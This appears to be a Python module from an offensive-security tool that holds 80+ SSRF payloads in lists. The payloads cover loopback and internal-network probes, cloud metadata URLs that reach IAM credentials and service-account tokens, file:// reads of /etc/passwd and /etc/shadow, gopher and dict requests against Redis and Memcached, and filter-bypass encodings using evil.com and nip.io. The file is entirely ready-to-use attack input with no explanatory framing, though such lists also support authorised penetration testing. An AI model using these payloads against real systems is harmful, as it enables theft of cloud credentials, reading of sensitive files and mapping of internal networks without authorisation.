"""SSRF Payload库 - 80+ Payloads"""

SSRF_BASIC = [
    "http://127.0.0.1",
    "http://127.0.0.1/",
    "http://localhost",
    "http://localhost/",
    "http://0.0.0.0",
    "http://127.1",
    "http://127.0.1",
    "http://0",
    "http://[::1]",
    "http://[::]",
    "http://[0:0:0:0:0:0:0:1]",
    "http://127.0.0.1:80",
    "http://127.0.0.1:443",
    "http://127.0.0.1:22",
    "http://127.0.0.1:8080",
    "http://127.0.0.1:3306",
    "http://127.0.0.1:6379",
    "http://127.0.0.1:27017",
]

CLOUD_METADATA = [
    # AWS
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/ami-id",
    "http://169.254.169.254/latest/meta-data/instance-id",
    "http://169.254.169.254/latest/meta-data/hostname",
    "http://169.254.169.254/latest/meta-data/local-ipv4",
    "http://169.254.169.254/latest/meta-data/public-ipv4",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/user-data/",
    "http://169.254.169.254/latest/dynamic/instance-identity/document",
    # GCP
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/instance/",
    "http://metadata.google.internal/computeMetadata/v1/project/",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    "http://169.254.169.254/computeMetadata/v1/",
    # Azure
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://169.254.169.254/metadata/identity/oauth2/token",
    # DigitalOcean
    "http://169.254.169.254/metadata/v1/",
    "http://169.254.169.254/metadata/v1/id",
    "http://169.254.169.254/metadata/v1/hostname",
    # Alibaba
    "http://100.100.100.200/latest/meta-data/",
    "http://100.100.100.200/latest/meta-data/instance-id",
    # Oracle Cloud
    "http://169.254.169.254/opc/v1/instance/",
    # Kubernetes
    "https://kubernetes.default.svc/",
    "https://kubernetes.default/",
]

SSRF_PROTOCOLS = [
    "file:///etc/passwd",
    "file:///etc/shadow",
    "file:///etc/hosts",
    "file:///C:/Windows/win.ini",
    "file:///C:/Windows/system.ini",
    "gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aPING%0d%0a",
    "gopher://127.0.0.1:6379/_INFO%0d%0a",
    "dict://127.0.0.1:6379/INFO",
    "dict://127.0.0.1:11211/stats",
    "ftp://anonymous:anonymous@127.0.0.1/",
    "sftp://127.0.0.1/",
    "tftp://127.0.0.1/",
    "ldap://127.0.0.1/",
    "ldaps://127.0.0.1/",
    "jar:http://127.0.0.1/test.jar!/",
]

SSRF_BYPASS = [
    # IP变形
    "http://2130706433",  # 127.0.0.1 decimal
    "http://017700000001",  # 127.0.0.1 octal
    "http://0x7f000001",  # 127.0.0.1 hex
    "http://0177.0.0.1",
    "http://0x7f.0x0.0x0.0x1",
    "http://127.1",
    "http://127.0.1",
    "http://0",
    # DNS绕过
    "http://127.0.0.1.nip.io",
    "http://127.0.0.1.xip.io",
    "http://www.127.0.0.1.nip.io",
    "http://customer1.app.localhost.my.company.127.0.0.1.nip.io",
    # URL解析绕过
    "http://evil.com@127.0.0.1",
    "http://127.0.0.1#@evil.com",
    "http://127.0.0.1%23@evil.com",
    "http://evil.com\\@127.0.0.1",
    "http://127.0.0.1:80@evil.com",
    # 重定向绕过
    "http://evil.com/redirect?url=http://127.0.0.1",
    # 编码绕过
    "http://127.0.0.1%2523@evil.com",
    "http://127%2e0%2e0%2e1",
    "http://%31%32%37%2e%30%2e%30%2e%31",
    # Unicode绕过
    "http://127。0。0。1",
    "http://①②⑦.0.0.1",
    # Enclosed alphanumerics
    "http://⑯⑨.②⑤④.⑯⑨.②⑤④/",
]

SSRF_INTERNAL_SCAN = [
    "http://192.168.0.1",
    "http://192.168.1.1",
    "http://10.0.0.1",
    "http://172.16.0.1",
    "http://192.168.0.1:80",
    "http://192.168.0.1:8080",
    "http://192.168.0.1:443",
    "http://192.168.0.1:22",
]

ALL_SSRF = SSRF_BASIC + CLOUD_METADATA + SSRF_PROTOCOLS + SSRF_BYPASS + SSRF_INTERNAL_SCAN
